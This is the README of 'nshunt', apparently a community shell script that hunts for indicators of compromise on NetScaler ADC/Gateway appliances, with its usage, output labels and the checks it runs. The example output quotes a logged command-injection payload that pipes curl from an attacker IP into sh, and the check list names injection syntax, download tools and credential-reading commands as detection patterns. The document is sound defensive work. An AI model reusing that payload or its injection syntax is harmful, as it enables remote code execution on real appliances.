# nshunt

A quick, read-only compromise hunt for NetScaler ADC / Gateway appliances.

Official IOC scanners produce long reports full of legitimate files. `nshunt.sh`
does the opposite: it prints **only findings**, grouped by how serious they are,
so a clean appliance produces a three-line result.

> This is an unofficial community tool. It is not affiliated with or endorsed by
> Cloud Software Group / Citrix. A clean result does not prove an appliance is
> uncompromised - it only means none of these specific indicators were found.

## Usage

Copy the script to the appliance and run it as `root` from the shell:

```sh
scp nshunt.sh nsroot@<netscaler-ip>:/var/tmp/
ssh nsroot@<netscaler-ip>
shell
cd /var/tmp
sh nshunt.sh
```

Or download it directly on an appliance with internet access:

```sh
cd /var/tmp
curl -O https://raw.githubusercontent.com/kolbicz/nshunt/main/nshunt.sh
sh nshunt.sh
```

The output is shown on screen and saved to `results-nshunt.txt` in the current
directory (`/var/tmp` survives a reboot, `/tmp` does not). Set
`NSHUNT_OUT=/path/file` to save it elsewhere.

The script changes nothing on the appliance. Apart from the results file it only
creates a temporary directory in `/tmp`, which it removes when it finishes. It needs nothing beyond
the tools every NetScaler ships with (`sh`, `find`, `grep`, `awk`, `gzip`, `ls`).

Copy it in **binary mode** (`scp`, or binary mode in WinSCP/FileZilla). If the
file picks up Windows line endings on the way, the script detects that and
prints the command to fix it.

## Output

Each finding is labelled:

| Label        | Meaning |
|--------------|---------|
| `COMPROMISE` | Signs that the appliance was, or may have been, compromised |
| `ATTEMPT`    | Attack **attempts** found in the logs still on the appliance. An attempt is not a success - only `COMPROMISE` findings are signs that an attack worked |
| `REVIEW`     | Unusual, needs a human look - often legitimate |

The numbers in the `RESULT` line count finding blocks, i.e. kinds of evidence,
not IP addresses or attempts. The output ends with a short "What this means"
section that explains the result in plain words.

Example:

```
NetScaler quick hunt 1.4 - ns01 - 2026-09-30 14:43

[COMPROMISE] CVE-2019-19781 exploit files: this box was exploited (Jan 2020 wave)
       Jan 11 2020 16:04  /var/vpn/bookmark/pwnpzi1337.xml  (exploit file name)

[ATTEMPT] Shell commands sent in the VPN login name (command injection)
       203.0.113.10     3 attempt(s)  2026-09-29 07:28 .. 2026-09-29 13:31 UTC
         tried: pitboss PPE unexpectedly died NSPPE;U=http://203.0.113.10:8899/s;curl${IFS}$U|sh;# X
       Files the attacks tried to create:
         not present now (never created, or removed since): /var/netscaler/logon/LogonPoint/x.html
           web requests for /logon/LogonPoint/x.html: status 404 x12
       Check firewall logs for connections from the NetScaler to:
         http://203.0.113.10:8899/s

RESULT: 1 COMPROMISE, 1 ATTEMPT, 0 REVIEW.
        (number of [COMPROMISE] / [ATTEMPT] / [REVIEW] blocks above - each block is one
        kind of evidence, not an IP address or an attempt; see the lines in each block)
Scanned: 24 bookmark files in /var/vpn/bookmark, 26 ns.log files, 5 web access log files (0 unreadable).
Log checks only see logs still on the box (back to Sep 29); older attacks need your syslog server.

What this means:
  COMPROMISE - signs that the box WAS compromised. Treat it as compromised:
               do not reboot or upgrade yet, copy /var/log and the listed
               files off the box, check the HA peer, then rebuild it and
               change nsroot, LDAP/RADIUS bind passwords and certificate
               keys (Citrix CTX694799).
  ATTEMPT    - attack attempts in the logs (on their own not proof of success);
               together with the COMPROMISE findings they show when and
               how the box was compromised.
Saved to: /var/tmp/results-nshunt.txt
```

### Exit codes

| Code | Meaning |
|------|---------|
| `0`  | No findings |
| `1`  | Findings |
| `2`  | Scan **incomplete** - a log could not be read, a check crashed, or a file system error occurred. Do not trust "no findings" with exit code 2. |

If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still run.

## What it checks

1. **CVE-2019-19781 ("Shitrix") artifacts** - bookmark files in `/var/vpn/bookmark`
   with the public exploit's file name (`pwnpzi*`) or template code are `COMPROMISE`.
   Bookmarks last modified during the January 2020 mass-exploitation wave are
   `REVIEW`, labelled as empty stub or real bookmarks, because the date alone is
   not proof. Files owned by `nobody` in `/netscaler/portal/templates` are `COMPROMISE`.
2. **Command injection through the VPN login** - failed logins and
   authentication requests in `ns.log*` whose user name contains shell syntax
   (`` ` ``, `${IFS}` also URL-encoded, `$(`, `| sh`) or a fake packet-engine
   message (`pitboss`, `...died NSPPE;`, `missed too many heartbeats`).
   Summarised per attacker IP with the number of attempts, time range and
   payload, plus everything those IPs requested from the web server (status
   codes and successful URLs). For files the payload tried to create in a web
   folder it reports whether they exist now (`COMPROMISE` if so) and how the web
   server answered requests for them. A successful (`2xx`) download after the
   first attempt is `COMPROMISE` - for example an attack that packs `/flash/nsconfig`
   into a file in the login page and then downloads it. Successes before the
   attempt are only counted, not reported as an attack. It also lists download URLs to look for in your
   firewall logs. The same payload text copied into `/var/log/messages` is
   reported too.
3. **Path-traversal probes carrying commands** - requests the NetScaler logged
   and blocked as `Path traversal detected` that contained `curl`, `wget` or
   command separators, per source IP.
4. **Web shells** - PHP, Perl, Python or shell scripts, or `<?php` / `<?=` code
   inside other files, in web folders outside the stock admin UI, and
   `passthru(` / `NSC_TASS` in `LogonPoint/custom` and `/var/vpn`.
5. **Files written by the web server** - files owned by `nobody` in
   `/var/netscaler/logon`, `/var/netscaler/gui` and `/netscaler/ns_gui`.
6. **Hidden files** in web folders. The published web shell name
   `.ctxs.receiver` is `COMPROMISE`.
7. **Credential stealers in the login page** - JavaScript that contains an
   external URL next to code that captures or sends data (`password`, `fetch(`,
   `XMLHttpRequest`, `sendBeacon`, `atob`, `new Image`, ...), anywhere in the
   file and across line breaks, plus HTML that loads scripts from external sites.
   Stock Citrix code only talks to `localhost` or relative paths and is not flagged.
8. **Unknown setuid/setgid programs** outside the standard system folders and
   the NetScaler's own `ping`/`traceroute`.
9. **Crontabs** - user crontabs in `/var/cron/tabs`, and `/etc/crontab` lines
   that download from anywhere but the appliance itself.
10. **Unknown programs in temp folders** (`/tmp`, `/var/tmp`, `/var/nstmp`),
    excluding the NIC firmware tools and caches that NetScaler upgrades leave there
    and the NetScaler Console Security Advisory scan scripts.
11. **Web server config** (`/etc/httpd.conf`, `/flash/nsconfig/httpd.conf`) -
    PHP handlers for non-PHP files such as `.deb` or `.sig`, and aliases that map
    an image or CSS URL (e.g. `/vpn/media/<hex>.ico`, `receiver.min.css`) onto a
    hidden, `.sig` or `.deb` file are `COMPROMISE` (WHIPSHOT persistence).
    `php_flag engine on` and commented-out protection lines are `REVIEW`.
12. **Startup scripts** (`rc.netscaler`, `nsbefore.sh`, `nsafter.sh`) that run
    Python, base64 loaders, downloads or `chmod +s` at boot, and decoders,
    Python one-liners or reversed path strings in `ns.conf` and `/etc/rc`.
13. **Disguised files** - `.deb` files in web folders that are not real packages
    (WHIPSHOT is a PHP web shell disguised as a `.deb`), and scripts in the
    Gateway client-package and media folders, which should only hold packages
    and images.
14. **Setuid shells** - `/bin/sh` or another shell or interpreter with the
    setuid/setgid bit, which gives web shells root.
15. **SLAPSHOT tunnel and payload processes** - `/tmp/.uxdport`,
    `/tmp/.uxdlock`, Python processes that execute base64 payloads, and running
    `lula`, `update_c*.pl` or `/.x` processes.
16. **Web access logs** (`httpaccess*.log*`, including the Gateway's
    `httpaccess-vpn.log`) - requests for `<hex>.ico` / `.sig` web shell URLs, and
    `INDEX:<base64>` or base64-only User-Agents, shown decoded.
17. **Packet engine crashes** - crash dumps and crash or failed-DTLS-handshake
    log lines from the last 14 days, in `/var/core`, `/var/crash`, `ns.log*` and
    `/var/log/messages*` (CVE-2026-88772 exploits crash the packet engine).
18. **Known attacker IP addresses** published by Mandiant, GreyNoise, Lupovis
    and Gotham Technology Group, in `ns.log*`, `/var/log/messages*` and the web
    access logs, and in current connections.
19. **Files written by the published exploit payloads** - known dropped file
    names (`/.x`, `/s`, `lula`, `/var/1.py`, `update_c*.pl`, `wtw*`,
    `themes/wt88771*`, `nx_verify.html`, `c88771*`, `xua.html`, `/var/tmp/sh`,
    `insight-new.js`, `admin_ui/e.txt` / `log.txt`), small files containing the
    output of `id`, and gzip, zip or tar archives disguised as web files - how a
    stolen `/flash/nsconfig` is staged for download. Only name, size and date are
    shown, never the contents.
20. **Exploit, scanner and probe strings** in the web and error logs - canary
    and scanner strings (`ns-88771-poc`, `PoCbit`, `NX-CVE-OK`, `httpworkbench`),
    requests for the `.ctxs.receiver` web shell, 1-byte `nsepa.deb` probes,
    `vp_probe_nonexist`, `scanner-probe` logins, and errors for package or icon
    files in Gateway folders, each with its status codes and source IPs. The
    exploit canary `nx_verify.html` served with a `2xx` status is `COMPROMISE`:
    it only exists if an injected command ran. HeadlessChrome requests are
    `REVIEW`.
21. **Shell history** (`sh.log*`, `bash.log*`) - commands that read LDAP
    credentials or keys (`ldapsearch`, `openssl s_client`, `F1.key` / `F2.key`,
    `/flash/nsconfig/keys`). Searches run with `grep` and friends, by you or by
    other scanners, are ignored.

## Limitations

- **Logs rotate quickly.** The log checks only see the `ns.log*` and
  `httpaccess*.log*` files still on the appliance, often just a day or two.
  Search your syslog server or SIEM for older attacks; the script prints how far
  back the local logs go.
- **A missing file does not prove an attack failed** - the attacker may have
  removed it. The script says "not present now", not "failed".
- **File dates are modification times.** They can be changed and do not show
  when a file was created.
- **Heuristics.** The JavaScript check can miss well-hidden code and can flag
  harmless files. Compare a flagged file against the same file on another
  appliance running the same build.
- **Patching does not remove a past compromise.** If the appliance was ever
  compromised, rebuild it from a fresh install and rotate the `nsroot` password,
  LDAP bind passwords and certificate private keys.

## Testing on a copy

`NSHUNT_ROOT` prefixes every path the script reads, so it can scan a copied or
mounted file system instead of the live appliance:

```sh
NSHUNT_ROOT=/mnt/netscaler-image sh nshunt.sh
```

## Credits

Many indicators come from public research by Mandiant / Google Threat
Intelligence, GreyNoise, watchTowr, Lupovis, CERT-EU and Kevin Beaumont. The
checks added in 1.3 are based on the indicator list of Thomas Poppelgaard's
[netscaler-ctx697096-checker](https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker),
which includes indicators from Gotham Technology Group and Manuel Winkel
(Deyda Consulting).

## License

[MIT](LICENSE)
